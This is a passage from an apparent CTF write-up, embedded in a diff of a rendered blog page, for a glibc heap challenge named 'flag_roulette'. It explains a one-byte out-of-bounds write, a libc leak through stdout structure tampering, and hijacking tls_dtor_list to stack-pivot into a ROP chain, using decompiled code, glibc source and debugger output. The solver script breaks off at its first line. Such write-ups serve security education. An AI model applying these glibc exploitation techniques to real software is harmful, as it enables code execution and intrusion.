+</span></span><span class="line"><span class="cl">              <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;The bet is not risky enough&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="sc">&#39;2&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">has_a_bet</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">free</span><span class="p">(</span><span class="n">bet</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bet</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Bet successfully deleted&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">has_a_bet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="k">else</span>
+</span></span><span class="line"><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You have no bet placed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">has_a_bet</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You have not placed a bet !&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Your bet : %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">bet</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">v8</span><span class="p">;</span> <span class="n">k</span> <span class="o">+=</span> <span class="mi">3</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">bet</span> <span class="o">+</span> <span class="n">k</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">71</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">lose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">bet</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">67</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">lose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">bet</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">67</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">lose</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">win</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Within this function, we find three interactive menus:</p>
+<ul>
+<li>Place a bet</li>
+<li>Delete a bet</li>
+<li>Spin the roulette</li>
+</ul>
+<p>Focusing on each menu, we start with the first. This menu checks if a bet has been placed using the <code>has_a_bet</code> variable. If no bet is detected, it prompts for the size of the bet, accepting sizes within the range <code>0x80</code> to <code>0x21000</code>. This size parameter is used in a call to <code>malloc</code>, and the allocated memory is then filled with random values. Additionally, the menu offers an option to modify <strong>one byte</strong> within the allocated chunk, with no bounds checking implemented. This oversight introduces a <strong>relative out-of-bound write</strong> vulnerability, exploitable as long as the offset remains within the <code>unsigned int</code> maximum value. Understanding this flaw, we temporarily shift our focus from this menu.</p>
+<p>The second menu&rsquo;s functionality is straightforward: it frees the previously allocated chunk. Similarly, the third menu simply displays the bet before invoking <code>exit</code>.</p>
+<p>After scrutinizing the <code>main</code> functions and their behaviors, we should now strategize on exploiting the identified vulnerability to achieve code execution.</p>
+<h3 id="solution">Solution</h3>
+<p>Summarizing our progress:</p>
+<ul>
+<li>Allocation of a chunk is possible within the size range from <code>0x80</code> to <code>0x21000</code>.</li>
+<li>Only a single chunk can be active at any given time.</li>
+<li>The ability to free the currently active chunk is available.</li>
+<li>Execution of an exit command is permitted.</li>
+</ul>
+<p>Typically, in exploiting such scenarios, the initial step involves obtaining a memory leak. Following this, we strategize on utilizing the leak to facilitate code execution.</p>
+<h4 id="getting-libc-leak">Getting libc leak</h4>
+<p>In order to achieve code execution, the first step is figuring out how to get a leak. It&rsquo;s noteworthy that the largest chunk size we can allocate is significantly large, more than <code>0x20000</code>. Looking into how <code>malloc</code> works, there&rsquo;s a detail where, if the requested size is large (exceeding the <code>mp_.mmap_threshold</code>, which defaults to <code>128*1024 = 0x20000</code>), it uses <code>mmap</code> instead of placing the chunk in the heap.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">DEFAULT_MMAP_THRESHOLD</span>     <span class="mi">128</span> <span class="o">*</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">malloc_par</span> <span class="n">mp_</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="n">mmap_threshold</span> <span class="o">=</span> <span class="n">DEFAULT_MMAP_THRESHOLD</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="nf">sysmalloc</span> <span class="p">(</span><span class="n">INTERNAL_SIZE_T</span> <span class="n">nb</span><span class="p">,</span> <span class="n">mstate</span> <span class="n">av</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">     If have mmap, and the request size meets the mmap threshold, and
+</span></span></span><span class="line"><span class="cl"><span class="cm">     the system supports mmap, and there are few enough currently
+</span></span></span><span class="line"><span class="cl"><span class="cm">     allocated mmapped regions, try to directly map this request
+</span></span></span><span class="line"><span class="cl"><span class="cm">     rather than expanding top.
+</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">==</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">      <span class="o">||</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	  <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">mp_</span><span class="p">.</span><span class="n">n_mmaps</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">n_mmaps_max</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">char</span> <span class="o">*</span><span class="n">mm</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#if HAVE_TUNABLES
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">mp_</span><span class="p">.</span><span class="n">hp_pagesize</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">nb</span> <span class="o">&gt;=</span> <span class="n">mp_</span><span class="p">.</span><span class="n">hp_pagesize</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="cm">/* There is no need to isse the THP madvise call if Huge Pages are
+</span></span></span><span class="line"><span class="cl"><span class="cm">	     used directly.  */</span>
+</span></span><span class="line"><span class="cl">	  <span class="n">mm</span> <span class="o">=</span> <span class="nf">sysmalloc_mmap</span> <span class="p">(</span><span class="n">nb</span><span class="p">,</span> <span class="n">mp_</span><span class="p">.</span><span class="n">hp_pagesize</span><span class="p">,</span> <span class="n">mp_</span><span class="p">.</span><span class="n">hp_flags</span><span class="p">,</span> <span class="n">av</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	  <span class="k">if</span> <span class="p">(</span><span class="n">mm</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	    <span class="k">return</span> <span class="n">mm</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>      <span class="n">mm</span> <span class="o">=</span> <span class="nf">sysmalloc_mmap</span> <span class="p">(</span><span class="n">nb</span><span class="p">,</span> <span class="n">pagesize</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">av</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">mm</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">mm</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">tried_mmap</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s examine the heap memory layout when we execute <code>malloc(0x21000)</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; vmmap
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">0x00007ffff7d8c000 0x00007ffff7db1000 0x0000000000025000 0x0000000000000000 rw- &lt;tls-th1&gt;
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">gef&gt; x/20gx 0x00007ffff7d8c000
+</span></span><span class="line"><span class="cl">0x7ffff7d8c000: 0x0000000000000000      0x0000000000022002
+</span></span><span class="line"><span class="cl">0x7ffff7d8c010: 0x45793d7536367100      0x703d5e772852523b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>You&rsquo;ll notice that the chunk is positioned near the <code>tls</code> and <code>libc</code> areas. This means that by calling <code>malloc(0x21000)</code>, this kind of setup allows us to overwrite <strong>one-byte</strong> at any writable address within the <code>tls</code> and <code>libc</code> regions.</p>
+<p>But what if we want to write more? The first idea might be to <code>free</code> the chunk and then call <code>malloc</code> again. However, trying this initially leads to an error as follows.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">How many bytes would you like to bet on ?
+</span></span><span class="line"><span class="cl">&gt; 135168
+</span></span><span class="line"><span class="cl">[1]    58259 invalid system call  ./flag_roulette_patched
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using <code>strace</code>, we found a <code>brk</code> syscall, showing us that our attempt to use <code>malloc</code> didn&rsquo;t trigger <code>mmap</code> as we expected.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">brk(0x55bf6fa19000)                     = 0xc
+</span></span><span class="line"><span class="cl">+++ killed by SIGSYS +++
+</span></span><span class="line"><span class="cl">[1]    58515 invalid system call  strace ./flag_roulette_patched
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Digging into why this happened, we looked at how <code>free</code> works and discovered something interesting. When you free a chunk that was allocated with <code>mmap</code>, it changes the <code>mp_.mmap_threshold</code> to the size of the chunk you just freed. So, our next <code>malloc(0x21000)</code> didn&rsquo;t use <code>mmap</code> because, according to the new threshold, <code>0x21000</code> wasn&rsquo;t big enough.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__libc_free</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">mem</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">chunk_is_mmapped</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span>                       <span class="cm">/* release mmapped memory. */</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="cm">/* See if the dynamic brk/mmap threshold needs adjusting.
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 Dumped fake mmapped chunks do not affect the threshold.  */</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mp_</span><span class="p">.</span><span class="n">no_dyn_threshold</span>
+</span></span><span class="line"><span class="cl">          <span class="o">&amp;&amp;</span> <span class="nf">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span>
+</span></span><span class="line"><span class="cl">          <span class="o">&amp;&amp;</span> <span class="nf">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">DEFAULT_MMAP_THRESHOLD_MAX</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span> <span class="o">=</span> <span class="nf">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">mp_</span><span class="p">.</span><span class="n">trim_threshold</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="nf">LIBC_PROBE</span> <span class="p">(</span><span class="n">memory_mallopt_free_dyn_thresholds</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">,</span> <span class="n">mp_</span><span class="p">.</span><span class="n">trim_threshold</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">munmap_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To get around this, we need a good strategy. We noticed something in the <code>__libc_free</code> function: it only changes the <code>mp_.mmap_threshold</code> if <code>mp_.no_dyn_threshold</code> is 0 (false). We still have a <strong>one-byte</strong> out-of-bounds (OOB) write ability from when we allocated our chunk, and this offset from the <code>libc</code> area doesn&rsquo;t change. This means we can tweak the <code>mp_.no_dyn_threshold</code> to 1 (true). Doing this means the threshold won&rsquo;t change when we free a chunk, allowing us to do as many OOB writes to the <code>tls</code> and <code>libc</code> areas as we want. This works because our <code>malloc(0x21000)</code> will always use <code>mmap</code>, placing the chunk right before the <code>tls</code> and <code>libc</code> areas.</p>
+<p>Now that we have the power to write out of bounds to <code>tls</code> and <code>libc</code> without limits, we can leak the <code>libc</code> address. The trick is to mess with <code>stdout</code>: change <code>stdout-&gt;flags</code> to <code>0x1800</code> and make <code>stdout-&gt;_IO_write_ptr</code> bigger than <code>stdout-&gt;_IO_write_base</code>. The next time we use <code>puts()</code>, it&rsquo;ll spit out data from <code>_IO_write_base</code> to <code>_IO_write_ptr</code>, giving us the <code>libc</code> leak we need to move forward.</p>
+<h4 id="stack-pivot-via-tls-dtor">Stack Pivot via TLS DTOR</h4>
+<p>To achieve remote code execution, given the program terminates with <code>exit</code>, a common approach is to hijack the <code>tls_dtor_list</code> with a custom fake structure. This way, when <code>__run_exit_handlers</code> triggers <code>__call_tls_dtors</code>, it processes our crafted structure, allowing us a controlled call with the first argument in our hands.</p>
+<p>However, this isn&rsquo;t enough because there is seccomp, which limit our action to do the <code>open-read-write</code> of the flag file. So, I was thinking that we need to somehow do ROP, which mean we need to be able to do stack pivoting. After looking through all the available gadgets, I found one very good gadget</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x00099ab4: mov rbp, [rsi+8]; mov rax, [rbx+0x40]; test byte ptr [rbx+0x50], 1; jne short 0x99a98; mov rdi, rsi; call rax;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This gadget is perfect for our needs because we found out that we can control both the <code>[rsi+8]</code> and <code>rbx</code> values. Here’s how it works in the context of our fake <code>dtor_list</code>:</p>
+<ul>
+<li><code>rbx</code> will point to the address of our crafted fake <code>dtor_list</code>.</li>
+<li><code>rsi</code> points to <code>__exit_funcs</code>, part of the <code>libc</code> area, allowing us to overwrite this section.</li>
+</ul>
+<p>With these controls in place, the path to exploitation becomes quite clear. Here&rsquo;s a simple walkthrough of what I did to make it work:</p>
+<ul>
+<li>Make <code>PTR_MANGLE</code> zero to simplify creating our fake <code>dtor_list</code>.</li>
+<li>Store <code>/flag</code> string in the <code>tls</code> area. We know its exact location thanks to its fixed distance from the libc base.</li>
+<li>Change the <code>tls_dtor_list</code> (found at <code>tls_base-0x50</code>) to point to our fake <code>dtor_list</code>.</li>
+<li>Now, at the address we&rsquo;ve set in the <code>tls_dtor_list</code>, we create our fake <code>dtor_list</code>. The key move here is:
+<ul>
+<li>Set <code>dtor_list-&gt;func</code> to <code>pivot_stack_gadget&lt;&lt;17</code>.</li>
+</ul>
+</li>
+<li>Modify <code>[rsi+0x8]</code> (which corresponds to <code>__exit_funcs+0x8</code>) to point towards our ROP chain (<code>location-0x8</code>). This is essential for our stack pivot maneuver using <code>leave ; ret</code>, which essentially does <code>mov rsp, rbp ; pop rbp ; ret</code>.</li>
+<li>Place the <code>leave ; ret;</code> gadget&rsquo;s address at <code>[rbx+0x40]</code> (<code>fake_dtor_list+0x40</code>). Our stack pivot gadget will execute <code>call rax</code>, with <code>rax</code> coming from this address.</li>
+<li>To avoid the jne jump in our gadget&rsquo;s flow, set <code>[rbx+0x50]</code> to <code>0</code>.</li>
+<li>Fill in our ROP chain at the address we&rsquo;ve set up in <code>__exit_funcs+0x8</code>.</li>
+<li>Trigger the exit mechanism to set everything into motion.</li>
+</ul>
+<p>By following these steps, we manage to get the flag. Below, you&rsquo;ll find my solver script with detailed comment.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
